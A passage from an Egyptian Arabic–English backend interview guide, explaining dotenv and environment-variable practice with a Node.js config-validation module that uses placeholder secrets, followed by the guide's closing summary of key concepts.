    const [users, total] = await Promise.all([
      User.find(filter).sort(sort).skip(skip).limit(limit).lean(),
      User.countDocuments(filter),
    ]);

    res.json({
      success: true,
      data:    users,
      meta: { page, limit, total, totalPages: Math.ceil(total / limit) },
    });
  }
);
```

**[⬆ Back to Top](#)**

---

### 25. إيه هو `dotenv` وإيه الـ Best Practices للـ Environment Variables؟

---

#### 🧠 الشرح

الـ Environment Variables هي حاجة من أهم المفاهيم في الـ Professional Backend Development. وكتير جداً من الـ Junior Developers بيتجاهلوها أو بيستخدموها غلط.

**الـ Problem:**

تخيّل إنك بتطوّر App وعندك:
- Database Password: `super_secret_pass`
- JWT Secret: `my_jwt_key`
- Stripe API Key: `sk_live_123456789`
- Email API Key: `SG.abcdef...`

لو حطّيت الـ Values دي مباشرة في الكود (Hard-coded)، وعملت Push للـ Code على GitHub — كل اللي يدخل على الـ Repo هيشوف الـ Secrets دي! وفيه Bots شغّالة 24/7 على GitHub بتدور على API Keys. في دقائق، الـ Keys دي ممكن تتستخدم.

**الـ Solution — 12-Factor App Principle:**

الـ Configuration (Secrets, URLs, Ports) لازم تيجي من **Environment Variables** مش من الكود. ده بيسمح لك إنك تشغّل نفس الكود بـ Configurations مختلفة:
- **Development:** Database محلية، Logging مفصّل
- **Staging:** Database Test، بعض الـ Features معطّلة
- **Production:** Database الحقيقية، Logging أقل، Security أعلى

**`dotenv` Library:**

بتخليك تحط الـ Environment Variables في ملف `.env` في Local Development. الملف ده **مش بيترفع** على الـ Git. الـ Library بتقرأ الملف وبتحط القيم في `process.env`.

في الـ Production (Server حقيقي)، بتحدد الـ Environment Variables مباشرة على الـ Server (عبر الـ CI/CD Pipeline، Docker Secrets، AWS Secrets Manager، إلخ) — مش عن طريق `.env` file.

---

#### 💻 الكود

```javascript
// .env file — NEVER commit this to Git
// ============================================================
// DB_URI=mongodb+srv://user:password@cluster.mongodb.net/myapp
// JWT_ACCESS_SECRET=a-very-long-and-random-secret-key-here-min-64-chars
// JWT_REFRESH_SECRET=another-very-long-and-random-secret-key-for-refresh
// PORT=3000
// NODE_ENV=development
// BCRYPT_ROUNDS=12
// REDIS_URL=redis://localhost:6379
// SENDGRID_API_KEY=SG.xxxxxxxxxxxx
// AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
// AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
// MAX_FILE_SIZE_MB=10
// FRONTEND_URL=http://localhost:5173

// .gitignore — ALWAYS add .env files to gitignore
// ============================================================
// .env
// .env.local
// .env.*.local
// .env.production.local
// node_modules/

// ============================================================
// config/env.js — Centralized environment configuration
// ============================================================

const path = require("path");

// Load .env ONLY in development — in production, env vars come from the server/infra
if (process.env.NODE_ENV !== "production") {
  require("dotenv").config({
    path: path.resolve(__dirname, "../.env"), // Explicit path to avoid confusion
  });
}

// ============================================================
// VALIDATE REQUIRED ENVIRONMENT VARIABLES AT STARTUP
// ============================================================

// Define which env vars are required for the app to run
const requiredEnvVars = {
  DB_URI:              { description: "MongoDB connection string" },
  JWT_ACCESS_SECRET:   { description: "JWT signing secret for access tokens", minLength: 32 },
  JWT_REFRESH_SECRET:  { description: "JWT signing secret for refresh tokens", minLength: 32 },
};

// Optional env vars with defaults
const optionalEnvVars = {
  PORT:           { default: "3000" },
  NODE_ENV:       { default: "development" },
  BCRYPT_ROUNDS:  { default: "12" },
  MAX_FILE_SIZE_MB: { default: "5" },
};

// Validate at application startup — fail fast if something is missing
function validateEnv() {
  const errors = [];

  for (const [varName, config] of Object.entries(requiredEnvVars)) {
    const value = process.env[varName];

    if (!value) {
      errors.push(`Missing required environment variable: ${varName} (${config.description})`);
      continue;
    }

    if (config.minLength && value.length < config.minLength) {
      errors.push(`${varName} is too short. Minimum ${config.minLength} characters required for security.`);
    }
  }

  if (errors.length > 0) {
    console.error("\n❌ ENVIRONMENT CONFIGURATION ERRORS:");
    errors.forEach((err) => console.error(`   • ${err}`));
    console.error("\nPlease check your .env file or server environment configuration.\n");
    process.exit(1); // Exit immediately — don't start the server with missing config
  }

  // Apply defaults for optional vars
  for (const [varName, config] of Object.entries(optionalEnvVars)) {
    if (!process.env[varName]) {
      process.env[varName] = config.default;
    }
  }

  console.log("✅ Environment variables validated successfully");
}

validateEnv();

// ============================================================
// EXPORT TYPED CONFIG — Prevents scattered process.env access throughout the app
// ============================================================

// Having a centralized config object means:
// 1. All env vars are validated in one place
// 2. Type conversion happens once
// 3. Easy to mock in tests
// 4. Grep-able: search for "config.db.uri" instead of "process.env.DB_URI" everywhere

const config = {
  env: process.env.NODE_ENV,
  isProduction:  process.env.NODE_ENV === "production",
  isDevelopment: process.env.NODE_ENV === "development",

  server: {
    port: parseInt(process.env.PORT, 10),
    frontendUrl: process.env.FRONTEND_URL || "http://localhost:3000",
  },

  db: {
    uri: process.env.DB_URI,
  },

  jwt: {
    accessSecret:  process.env.JWT_ACCESS_SECRET,
    refreshSecret: process.env.JWT_REFRESH_SECRET,
    accessExpiry:  "15m",
    refreshExpiry: "7d",
  },

  bcrypt: {
    rounds: parseInt(process.env.BCRYPT_ROUNDS, 10),
  },

  redis: {
    url: process.env.REDIS_URL,
  },

  upload: {
    maxFileSizeBytes: parseInt(process.env.MAX_FILE_SIZE_MB, 10) * 1024 * 1024,
  },
};

module.exports = config;

// ============================================================
// USAGE — Import config, not process.env directly
// ============================================================

const config2 = require("./config/env");
const mongoose = require("mongoose");

mongoose.connect(config2.db.uri); // Clean and clear
app.listen(config2.server.port);
const token = jwt.sign(payload, config2.jwt.accessSecret, { expiresIn: config2.jwt.accessExpiry });
```

**[⬆ Back to Top](#)**

---

> ## 🏁 كلمة أخيرة من الـ Senior
>
> يا صديقي، الـ Backend Development مش بس كتابة كود بيشتغل — هو فهم **"ليه"** وراء كل قرار. الـ Interviewer المحترف مش بيدور على حد حافظ — هو بيدور على حد **فاهم**.
>
> لما تيجي الإنترفيو، مش محتاج تحفظ الكود كلمة كلمة. محتاج تفهم الـ Concepts وتقدر تشرحها بكلامك بطريقة بتوضّح إنك فكّرت فيها. الـ Analogy المبسّطة أحياناً بتقنع الـ Interviewer أكتر من الكود الكامل.
>
> **مراجعة سريعة للنقاط المهمة:**
> - **Event Loop** = قلب Node.js — Single Thread بس Non-Blocking
> - **Middleware** = سلسلة Functions كل واحدة بتعمل حاجة وبتعدّي للجاي
> - **BSON** = الفورمات الحقيقي لـ MongoDB — أسرع وأكثر Types من JSON
> - **N+1 Problem** = أكتر مشكلة Performance شيوعاً — الحل `populate()` أو Batch Fetch
> - **JWT** = Stateless Token — مناسب للـ Scale بس صعب Revoke
> - **CORS** = Browser Policy مش Server Problem — حلّها من الـ Server Headers
> - **bcrypt** = بطيء عمداً — ده الميزة مش العيب
>
> **بالتوفيق يا برو! 🚀**

---

*Made with ❤️ for Egyptian Junior Backend Developers — يلا نبني Backend محترم ونحترم نفسنا*
